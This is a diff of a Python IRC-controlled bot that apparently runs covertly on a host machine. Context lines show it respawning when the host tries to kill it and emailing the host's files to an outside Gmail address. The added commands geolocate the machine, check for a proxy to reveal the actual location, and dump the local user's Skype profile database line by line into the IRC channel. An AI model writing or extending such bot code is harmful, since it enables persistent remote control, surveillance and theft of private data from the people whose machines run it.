@@ -90,7 +90,7 @@ Public Commands (main channel): \n
 ############ Flow functions
 
 def timeout_handler(signum, frame):                               # handler for timeout exceptions
-    raise Exception("timedout")
+    raise Exception("timedout %s %s" % (signum, frame))
 
 def sigterm_handler(signum, frame):                               # if user tries to kill python process, it will spawn another one
     log('[#] ----Host attempted to shutdown bot----')
@@ -322,15 +322,18 @@ def geo_locate(ip="",with_proxy=False):                                         
     signal.signal(signal.SIGALRM, timeout_handler)
     signal.alarm(5)
     try:
-        if not with_proxy:
+        if with_proxy:
+            geo_json = urllib2.urlopen('http://freegeoip.net/json/').read()
+        else:
             proxy_handler = urllib2.ProxyHandler({})
             opener = urllib2.build_opener(proxy_handler)
             req = urllib2.Request('http://freegeoip.net/json/%s' % ip)
             r = opener.open(req)
             geo_json = r.read()
-        else:
-            geo_json = urllib2.urlopen('http://freegeoip.net/json/%s' % ip).read()
     except Exception as e:
+        signal.alarm(0)
+        if str(e).find("404") != -1:
+            return ["No location info available for IP","","","","",""]
         return ["failed: %s" % e,"","","","",""]
     signal.alarm(0)
 
@@ -351,7 +354,9 @@ def identify():                                                   # give some id
     system = platform.mac_ver()[0]
     if len(str(system)) < 1:
         system = platform.platform()
-    log('[>]    OS X:    ',system)
+        log('[>]    System:    ',system)
+    else:
+        log('[>]    OS X:    ',system)
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("8.8.8.8",80))
     local_ip = s.getsockname()[0]
@@ -367,8 +372,13 @@ def full_identify():                                              # give verbose
     log('[+] Running v%s Identification Modules...' % version)
     privmsg('[+] Running v%s Identification Modules...' % version)
     system = platform.mac_ver()[0]
-    log('[>]    OS X:    ',system)
-    privmsg('[>]      OS X:    %s' % system)
+    if len(str(system)) < 1:
+        system = platform.platform()
+        log('[>]    System:    ',system)
+        privmsg('[>]      System:    %s' % system)
+    else:
+        log('[>]    OS X:    ',system)
+        privmsg('[>]      OS X:    %s' % system)
 
     log('[>]    Bot:    ',local_user)
     privmsg('[>]      Bot:    %s' % local_user)
@@ -432,7 +442,7 @@ def full_identify():                                              # give verbose
 if __name__ == '__main__':
     if len(nick) > 15: nick = '[%s]' % (local_user[:13])          # if nick is over 15 characters, change to username truncated at 13 chars
     last_ping = time.time()                                       # last ping recieved
-    threshold = 8 * 60                                            # maximum time between pings before assuming disconnected
+    threshold = 8 * 60                                            # maximum time between pings before assuming disconnected (in seconds)
     quit_status = False
 
     while not quit_status:
@@ -466,7 +476,7 @@ if __name__ == '__main__':
                 sleep(10)
 
             while not quit_status and (timeout_count < 50):          # if timeout_count is above 50, reconnect
-                if (last_data == data):                              # IRC serves  will occasionally send lots of blank messages instead of disconnecting
+                if (last_data == data):                              # IRC servers  will occasionally send lots of blank messages instead of disconnecting
                     timeout_count += 1
                 last_data = data
                 try:
@@ -523,6 +533,30 @@ if __name__ == '__main__':
                     attch = data.split("$", 1)[1].split(',')
                     to = "nikisweeting+bot@gmail.com"
                     broadcast(sendmail(to.strip(),msg="whohooo",attch=attch))
+
+                elif scan('!geo'):
+                    location = str(geo_locate())
+                    broadcast(location)
+
+                elif privscan('geo'):
+                    location_with_proxy = str(geo_locate(with_proxy=True))
+                    location = str(geo_locate())
+                    if location_with_proxy == location:
+                        privmsg("Location: %s" % location)
+                    else:
+                        privmsg("Proxy Detected: %s" % location_with_proxy)
+                        sleep(1)
+                        privmsg("Actual Location: %s" % location)
+
+                elif scan('!skype'):
+                    try:
+                        broadcast(skype.findProfile(local_user))
+                        db_path = skype.findProfile(local_user)
+                        for line in skype.printProfile(db_path):
+                            broadcast(line)
+                            sleep(1)
+                    except Exception as error:
+                        broadcast(str(error))
 
                 elif privscan('skype$profile'):
                     try:
